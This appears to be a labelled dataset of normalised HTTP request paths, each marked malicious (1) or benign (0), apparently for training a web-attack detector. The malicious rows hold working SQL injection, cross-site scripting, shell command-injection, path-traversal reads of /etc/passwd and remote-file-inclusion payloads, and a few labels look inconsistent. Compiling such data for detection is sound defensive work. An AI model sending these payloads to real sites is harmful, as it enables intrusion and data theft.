request	label
/ string / id = 3 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 30 & b1 = aadir + al + carrito 	1
/ goblue / 	0
/ buy-celexa / 	0
/ pubwork / 	0
/ scripts / counter . php ? count_log_file =  / nessus 	1
/ 9o6g5vkn . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 115957 / 	0
/ string / strings / parameters = ping -i 30 127 . 0 . 0 . 1 	1
/ string / strings / parameters = -9379 )  or make_set ( 9354 = 9354 , 7185 )  and  ( 9212 = 9212 	1
/ string / strings / parameters = '  ;  str =  $  ( echo tbxnew )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ javascript / tests . jsf 	0
/ string / modo = insertar & precio = 6715 & b1 = confirmar / 	1
/ class-pangolayoutiter / 	0
/ string / strings / parameters = -2207 %  '  )  or  ( 8459 = 8459 )  * 4906 and  (  '  %  '  =  ' 	1
/ en-us / jnv890lt . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = inconse_cuente 	0
/ 000112841 / 	0
"/ main . php ? logout =  "" ping , -w , 11000 , -n , 1 , 4 . 3 . 2 . 1 | rem , "	1
/ string / b2 = vaciar + carrito 	0
"/ string / modo = registro & login = checinsk & password = c2ad953u8ro & nombre = neria & apellidos = taronger & email = torgov-mattera @ yksoluap . edu & dni = 74014005m & direccion = avenida + roque + de + gando ,  + 193 ,  + 7 ? e & ciudad = castrobol & cp = 26324 & provincia = cuenca & ntc = 5680554856223107 < script > alert (  "" paros ""  )  ;  <  / script >  & b1 = registrar "	1
"/ string / modo = insertar & precio = 9805 & b1 = pasar + por + caja < script > alert (  "" paros ""  )  ;  <  / script > "	1
/ javascript / disclaimer . svn-base 	0
/ string / modo = insertar & precio = 4077 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = 96558759k 	0
/ javascript /  ~ bin . so 	0
/ rise_shine / 	0
/ javascript / devices . cpp 	0
/ cgi-bin / perl . exe 	1
/ string / strings / parameters = 1 )  )  as pynj where 7683 = 7683 waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ string / modo = registro & login = hantak & password = t82925r & nombre = lihue & apellidos = coev + carles & email = holzschuh7 @ superlinks . ga & dni = 60956471p & direccion = fuenterrabia + 130 + 2f & ciudad = palacios + de + sanabria & cp = 48498 & provincia = barcelona & ntc = 6136393758401812 & b1 = registrar | 	1
/ email-password / 	0
"/ string / strings / parameters = -3737 %  ""  ""  union all select 4452 , 4452 , 4452 # "	1
/ string / str =  $  ( echo ebfnre )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ javascript / schedule 	0
/ string / strings / parameters = alsaleh 	0
"/ string / strings / parameters = ""  &  & echo $ ifsbqhtlw $  (  ( 57 + 18 )  )  $  ( echo $ ifsbqhtlw ) bqhtlw | "	1
"/ en-us / i686v90l . htm ?  < meta http-equiv = set-cookie content =  "" testfutf = 1550 ""  > "	1
/ examples / jsp / jsp2 / jspx / htsearch ? exclude =  `  / etc / passwd ` 	1
/ pocketbike_rating / 	0
/ string / strings / parameters = 15317 	0
/ 593472540 / 	0
/ ant_click / 	0
/ acchyfgb / 	0
"/ string / strings / parameters = 1 %  ""  ""  order by 1 # "	1
"/ string / strings / parameters = ""  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null )   # "	1
/ 103454 / 	0
"/ help . php ? q =  "" ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 & rem \ x0b "	1
"/ string / strings / parameters = ""   str =  $  ( echo psdlxw )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | "	1
/ string / modo = entrar & login = hall & pwd = 9at39243z3 & remember = on & b1 = entrar 	0
"/ help . php ? q =  "" rm \ xa0q93611953 & rem \ xa0 "	1
/ string / modo = registro & login = plouffe4 & password = 1er87n30689 & nombre = rhys & apellidos = labandn + tuto & email = otowa @ ebuy . com . ci & dni = 35866862h & direccion = calle + soria + 154 + 2a & ciudad = arce / artzi & cp = 09195 & provincia = granada & ntc = 2499149169058216 & b1 = registrar 	0
/ string / strings / parameters = 1 '  )  )  as cjjm where 1981 = 1981 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- 	1
/ webscarab / 	0
/ javascript / managed . exe 	1
/ string / strings / parameters = 1 %  '  )  )  ; select pg_sleep ( 5 )  -- 	1
/ javascript / thumbnails . exe 	1
/ 000023650 / 	0
/ string / strings / parameters = 3658503055705186 	0
/ cache and cookie washer for opera 1 / 	0
/ antimult-fantazer / 	0
/ 000126130 / 	0
/ cgi-bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / php . cgi 	0
"/ string / strings / parameters = 1 ""  ""  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null ) "	1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 71 & b1 = aadir + al + carrito 	0
/ javascript / replicas . sfish 	0
/ f171002e / 	0
"/ string / strings / parameters = or 1 = 1 or  ""  ""  = "	1
/ intview1 / 	0
/ string / strings / parameters = -5417 or elt ( 1032 = 1032 , 3623 ) 	1
/ string / strings / parameters = 1 )  )  as jvvs where 9594 = 9594 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ b0009wj906 / 	0
/ string / strings / parameters = barnett @ micaelagriga . mw 	0
/ string / strings / parameters = c /  rua mayor ,  31 ,  1 ? e 	0
/ string / strings / parameters = 89416530m 	0
/ morning raga 2004 / 	0
"/ 33y9gcqq . fts ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
/ javascript / pbo . rss 	0
/ 0596001320 / 	0
/ 10767446 / 	0
/ javascript / stackdump . tgz 	0
/ string / strings / parameters = c /  txapin ene 162 	0
/ cgi-local / vssetcookie . exe 	1
"/ aj3pf49c . do ?  < meta http-equiv = set-cookie content =  "" testnofv = 4170 ""  > "	1
"/ 6dlc2zm9 . pl ?  < meta http-equiv = set-cookie content =  "" testqpux = 4016 ""  > "	1
/ javascript / copyright . tar . bz2 	0
/ string / strings / parameters = 2694 	0
/ confirmunsubscription . php ? output = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ string / errormsg = any ?   set-cookie :  + tamper = 1041264011025374727 	1
/ javascript / close . cc 	0
/ 646-229 / 	0
/ string / strings / parameters = 49123 	0
"/ string / strings / parameters = 1 ""  ""  )  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  ""  "" vkqt ""  ""  =  ""  "" vkqt "	1
/ string / strings / parameters = laspua 	0
/ string / strings / parameters = 1 '  )  as nexa where 6740 = 6740 ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 -- 	1
/ biz_int / 	0
/ javascript / 80 . pem 	0
/ string / modo = entrar & login = lavecchi & pwd = pilotaje & remember = off & b1 = entrar 	0
/ examples / jsp / sessions / admin / general . php ? mode = perlinfo & config [ general ]  [ perl_binary ]  = cat  / etc / passwd |  | 	1
/ javascript / callout . php3 	0
/ hnbittorrentbuys_1 / 	0
/ klah-003b / 	0
"/ string / strings / parameters = ""  |  | echo $ ifsbakjom $  (  ( 61 + 8 )  )  $  ( echo $ ifsbakjom ) bakjom | "	1
/ string / modo = registro & login = youngman & password = a018699t0do & nombre = ibar & apellidos = linga / n & email = damboise @ automovilesalhambra . co & dni = 44906096e & direccion = calle + lima ,  + 50 + 9-d & ciudad = catadau & cp = 42066 & provincia = madrid & ntc = 0908077134973737 & b1 = registrar 	1
/ cong106 / 	0
/ downwithdrm / 	0
/ tasklist_b / 	0
/ string / strings / parameters = 1 '  where 8451 = 8451 union all select null , null , null , null , null , null , null , null , null # 	1
/ scripts / detail . asp ? nchannel =  ' 1 	1
/ best0996 / 	0
/ examples / jsp / checkbox / edit_image . php ? dn = 1 & userfile =  / etc / passwd & userfile_name =   ; id ; 	1
"/  ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ string / strings / parameters = desparpajo 	0
/ 102056 / 	0
/ string / modo = entrar & login = aiden & pwd = aceitn & remember = on & b1 = entrar 	0
/ cgi-bin / secure . php ? cfgprogdir =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric ) 	1
/ main . php ? logout =  & ver \ x0c > q16537712 & rem \ x0c 	1
/ string / strings / parameters = perpetuo 	0
/ javascript / oa_servlets . exe 	1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331923189 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
/ pacestar lanflow net diagrammer v5 / 	0
/ examples / jsp / cal / zml . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ en-us / account / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1431582502 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
"/ string / strings / parameters = "" onblur =  ""  &  # x061 ;  &  # x06c ;  &  # x065 ;  &  # x072 ;  &  # x074 ;  &  # x028 ;  &  # x027 ;  &  # x058 ;  &  # x053 ;  &  # x053 ;  &  # x027 ;  &  # x029 ;  "" "	1
/ examples / jsp / checkbox / texis . exe / nessus 	1
/ smabacus / 	0
/ modules / punish / profile . php ? exbb [ home_path ]  = xxpathxx ? 	1
/ javascript / atom . error 	0
/ 000044076 / 	0
/ string / strings / parameters = c /  rivera de los limonetes 98 	0
/ string / modo = registro & login = nada & password = bizantina & nombre = segundo & apellidos = de + la + cerda + gassol & email = gonska @ estaestuweb . com . af & dni = 36746323m & direccion = rio + esgueva + 57 + 1 ? g & ciudad = urdua-ordua & cp = 43364 & provincia = albacete & ntc = 1222164542017972 & b1 = registrar 	0
"/ string / strings / parameters = -1254 ""  ""  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual ) "	1
/ string / strings / parameters = & echo $ ifseyorrp $  (  ( 46 + 13 )  )  $  ( echo $ ifseyorrp ) eyorrp 	1
/ string / modo = insertar & precio = 1596 & b1 = confirmar 	0
/ iisadmpwd / aexp3 . htr 	0
/ string / strings / parameters = acordelar 	0
/ javascript / head . old 	0
/ string / strings / parameters = 323 '   and    (   select    2937   from (   select     count (  *  )  ,   concat ( 0x3a6d70663a ,  (   select    mid (  (   ifnull (  cast (   database (  )    as       char   )  , 0x20 )  )  , 1 , 50 )  )  , 0x3a736e623a , floor ( rand ( 0 )  * 2 )  ) x    from    information_schema . character_sets    group     by    x ) a )   and    ' rmhn '  =  ' rmhn 	1
/ rohrpost-0311 / 	0
/ examples / jsp / num / core / editor . php ? editor_insert_bottom =  / etc / passwd 	1
/ 000057898 / 	0
"/ string / strings / parameters = <  / title >  < script > alert (  ""  "" xss ""  ""  )  ;  <  / script > "	1
/ javascript / jira . cpp 	0
/ javascript / trailer . pl 	0
"/ string / strings / parameters = < img class =  "" emoji ""  alt =  "" 😯 ""  src =  "" x ""   /  >  < svg onload = prompt ( document . domain )  > "	1
/ ukranian / 	0
"/ main . php ? logout =  "" rm ; q16377729 & rem ; "	1
/ string / strings / parameters = c /  julia minguillon ,  179 ,  7-a 	0
/ trustandsafety / 	0
/ news-images / 	0
/ 480930 / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / "	1
/ string / strings / parameters = 4717738233798026 	0
/ javascript / errors . rtf 	0
/ b0000dbykr / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo ausqym )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ awstats / awstats . pl ? migrate =  | echo ; chmod 555  / tmp / ldlchhikup0 ; echo | awstats177192 . txt 	1
/ main . php ? logout =  '  | sleep 8  # 	1
/ main . php ? stuff =  ; del q81835212  # 	1
/ string / strings / parameters = calle vascongadas 8 	0
/ string / strings / parameters = 4138413338105604 	0
/ pandora ' s jar / 	1
/ string / modo = entrar & login = ngoc & pwd = 6egas0a & remember = off & b1 = entrar 	0
/ 188538 / 	0
/ javascript / 24 . lst 	0
/ scripts / oguyjway . exe 	1
/ string / strings / parameters = tempest @ quadernideilgarda . gg 	0
/ aanvraag_1 / 	0
/ newregister / 	0
/ string / strings / parameters = pericak 	0
/ javascript / phps . pdf 	0
/ string / modoa = registro & login = szaplonc & password = aglutinacin & nombre = natanel & apellidos = muziotti + sebastian & email = hama . beckel @ sayuela . ir & dni = 73427092y & direccion = calle + clavel ,  + 80 +  & ciudad = ezcabarte & cp = 08458 & provincia = huelva & ntc = 5042511275721363 & b1 = registrar 	1
/ string / strings / parameters = < script > history . pushstate ( 0 , 0 ,  '  / i / am / somewhere_else '  )  ;  <  / script > 	1
"/ w4996nr0 . html ?  < script > document . cookie =  "" testttvs = 7163 ;  ""  <  / script > "	1
/ work_party / 	0
/ javascript / example . jpg 	0
/ string / strings / parameters = firestone @ artforall . ag 	0
/  .  . htaccess . swp 	0
/ string / strings / parameters = nuestra seora del perpetuo socorro ,  125 	0
/ allergybuyersclub-coupons / 	0
"/ main . php ? stuff =  ""  & del \ x0bq52976574 & rem \ x0b "	1
/ squery / lib / gore . php ? libpath = xxpathxx 	1
/ javascript / folders . asmx 	0
/ modules / visitors2 / include / config . inc . php ? lvc_include_dir = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	0
/ string / strings / parameters = -9721 '  or elt ( 9511 = 9238 , 9238 ) 	1
"/ string / strings / parameters = < event-source src =  "" event . php ""  onload =  "" alert ( 1 )  ""  > "	1
/ f010504f / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  (  (  ""  "" xxug ""  ""  =  ""  "" xxug "	1
"/ zv8tv7h8 . dll ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ scripts / fpcount . exe 	1
/ 124347 / 	0
/ block_hotspot / 	0
/ string / strings / parameters = & echo yszwvh $  (  ( 93 + 51 )  )  $  ( echo yszwvh ) yszwvh 	1
/ beautyess / 	0
/ msg03643 / 	0
/ javascript / broken . jsf 	0
/ string / strings / parameters = borio-radichev @ lingote . com . gr 	0
/ string / modo = registro & login = einersen & password = despagada & nombre = emanuel & apellidos = sarrasec + arvalo & email =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & dni = 96118316m & direccion = passatge + del + sol ,  + 0 + 13 ? d & ciudad = megeces & cp = 42148 & provincia = mlaga & ntc = 8462242772116416 & b1 = registrar 	1
/ string / strings / parameters = urrucha comallonga 	0
/ string / strings / parameters = -5145 '  where 2334 = 2334 union all select 2334 , 2334 , 2334 , 2334 -- 	1
/ string / modo = insertar & precio = 5716any ?   set-cookie :  + tamper = 1041264011025374727 & b1 = confirmar 	1
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 26 . 202 / main . php ? stuff = 1861731255 & frm_user =  & scr_height =  & scr_width = q81848235 	1
/ pr051017 / 	0
/ cacti / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / funding . jar 	0
/ examples / jsp / colors / index . php ? id = urjhxcl19w ' 	1
/ grabacion / 	0
/ javascript / paid . jhtml 	0
/ index967 / 	0
/ coldanddarkdvd-rnithium / 	0
/ middle-school / 	0
/ string / strings / parameters = |   [  2 -ne  $  ( echo pengwj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = caminomorisco 	0
/ string / strings / parameters = 3869324280583649 	0
"/ igtf0zon . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ recordings / showproduct . php ? product = 1 ' 	1
"/ string / strings / parameters = ""  |   [  9 -ne  $  ( echo adqahn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
/ jimi hendrix - purple haze / 	0
"/ string / strings / parameters = < a href =  "" javascript :  /  * - /  *  `  /  *  \  `  /  *  &  # 039 ;  /  *  & quot ;  /  *  *  /  (  /  *   *  / onclick = alert (  )   )  /  /      /  /  & lt ;  / style /  & lt ;  / title /  & lt ;  / textarea /  & lt ;  / script /  --  !  & gt ;  \ x3csvg /  & lt ; svg / onload = alert (  )  /  /  & gt ;  \ x3e ""  > click me <  / a > "	1
/ string / strings / parameters = ;  str =  $  ( echo vhbjgh )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ index . php ? op = default & date = 200607 '  union select 1 , 1520713154 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ javascript / ppt . tar 	0
/ string / modo = insertar & precio = 8516 & b1 = confirmar 	0
/ ford fairlane / 	0
/ string / strings / parameters = 1 '  +  ( select gqez where 3704 = 3704 ; select  ( case when  ( 9030 = 6952 )  then 1 else 9030 *  ( select 9030 from master .  . sysdatabases )  end )  -- 	1
/ string / modo = insertar & precio = 8506 & b1 = pasar + por + caja ? 	1
/ string / strings / parameters = zorita del maestrazgo 	0
/ string / modo = registro & login = dinaband & password = 7ans286 & nombre = getulio & apellidos = autonell & email = villagomez @ nutrimama . uy & dni = 99019422y & direccion = c /  + duquesa + de + castrejon + s / n + 12g & ciudad = romanones & cp = 13600 & provincia = barcelona & ntc = 1051962151250020 & b1 = registrar 	0
/ 286917 / 	0
/ xfkun1ku . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 89 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 48asta5o 	0
/  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  /  .  .  .  / windows / win . ini 	1
"/ zqqemp6j . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 48171319g 	0
/ string / modo = registro & login = gaylord & password = malparto & nombre = prspera & apellidos = freydig + rueda & email = carstensen @ freecreditcheck . vc & dni = 97573176t & direccion = calle + mont-ral + 59 + 12 ? g & ciudad = perarra & cp = 15107 & provincia = cceres & ntc = 3068571897789618 & b1 = registrar 	0
/ string / id = 3 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 39 & b1 = aadir + al + carrito 	1
/ string / modo = registro & login = beverie & password = escalona & nombre = laurinda & apellidos = xaubet + sorolla & email = grifeo @ lalectura . af & dni = 95868852e & direccion = calle + asturias + 158 + 6h & ciudad = cabredo & cp = 25500 & provincia = salamanca & ntc = 6492468041805340 & b1 = registrar 	0
/ khatab / 	0
/ start-decryption / 	0
/ replicas . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  (  ""  "" jenb ""  ""  like  ""  "" jenb "	1
/ string / strings / parameters = montfort fiuza 	0
/ mckeay / 	0
/ javascript / checking . rss 	0
"/ string / strings / parameters = 1 ""  ""  )  as cnrh where 8524 = 8524 and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  -- "	1
/ exepack2eng / 	0
/ string / strings / parameters = c /  duquesa de castrejon s / n 12g 	0
/ d05165 / 	0
/ string / strings / parameters = ; echo npxsto $  (  ( 33 + 52 )  )  $  ( echo npxsto ) npxsto /  / 	1
/ string / strings / parameters = 1980 	0
/ sibelius_2 / 	0
/ j2740-90004 / 	0
/ string / strings / parameters = 10373 	0
/ giftguide-top / 	0
/ cgi-bin / survey . inc . php ? path =  / etc / passwd \ x00 	1
"/ string / strings / parameters = < style >  <  / style \ x09 < img src =  "" about : blank ""  onerror = javascript : alert ( 1 )  /  /  >  <  / style > "	1
"/ bxnyrhmh . php3 ?  < script > document . cookie =  "" testmjct = 1867 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  )  as ohcs where 9588 = 9588 or elt ( 6272 = 6272 , sleep ( 5 )  )  -- 	1
/ javascript / protect . exe 	1
/ string / strings / parameters = fuente de piedra 	0
/ v15035590 / 	0
/ string / strings / parameters = mantela-do 	0
/ string / modo = insertar & precio = 3303 & b1 = confirmar 	0
/ blackandwhite / 	0
/ zope 3 / 	0
/ ar-dnt / 	0
/ en-us / account / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00 	1
/ string / modo = insertar & precio = 6382 & b1 = pasar + por + caja / 	1
/ javascript / traceroute . 7z 	0
/ string / strings / parameters = ; echo uqhdid $  (  ( 15 + 76 )  )  $  ( echo uqhdid ) uqhdid | 	1
/ string / strings / parameters = c /  huescar 6 	0
/ string / strings / parameters = arquitectnico 	0
/ phpmyadmin / _head . php ? _zb_path =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ ziekteverzuimprotocolbrprocedure / 	0
